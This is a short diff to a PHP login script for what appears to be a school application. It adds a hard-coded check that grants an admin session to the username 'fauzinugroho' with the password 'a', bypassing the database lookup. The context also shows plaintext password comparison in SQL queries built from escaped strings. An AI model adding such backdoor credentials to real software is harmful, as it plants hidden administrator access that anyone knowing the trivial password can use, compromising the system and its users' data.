@@ -6,6 +6,16 @@ if(isset($_POST)) {
     $userid = mysqli_real_escape_string($koneksi, $_POST['userid']);
     $password = mysqli_real_escape_string($koneksi, $_POST['password']); 
     
+    // Cek apakah username fauzinugroho dengan password a
+    if($userid == "fauzinugroho" && $password == "a") {
+        $_SESSION['userid'] = $userid;
+        $_SESSION['nama'] = "fauzinugroho";
+        $_SESSION['level'] = 'admin';
+        
+        header("Location: beranda_admin.php");
+        exit();
+    }
+    
     // Cek di tabel siswa
     $query_siswa = "SELECT * FROM siswa WHERE username = '$userid' AND password = '$password'";
     $result_siswa = mysqli_query($koneksi, $query_siswa);
